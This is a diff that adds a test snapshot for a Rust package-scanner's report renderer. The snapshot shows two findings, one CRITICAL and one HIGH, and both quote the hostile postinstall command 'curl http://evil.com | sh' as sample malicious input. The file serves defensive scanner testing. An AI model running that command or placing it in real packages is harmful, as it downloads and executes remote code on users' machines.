@@ -1,0 +1,15 @@
+---
+source: crates/scanner-report/tests/renderer_test.rs
+assertion_line: 30
+expression: output
+---
+
+   CRITICAL   package.json:1
+           Malicious postinstall script
+           > postinstall: curl http://evil.com | sh
+
+   HIGH   src/index.js:5
+           Shell execution in source
+           > postinstall: curl http://evil.com | sh
+
+   DANGEROUS  2 finding(s)
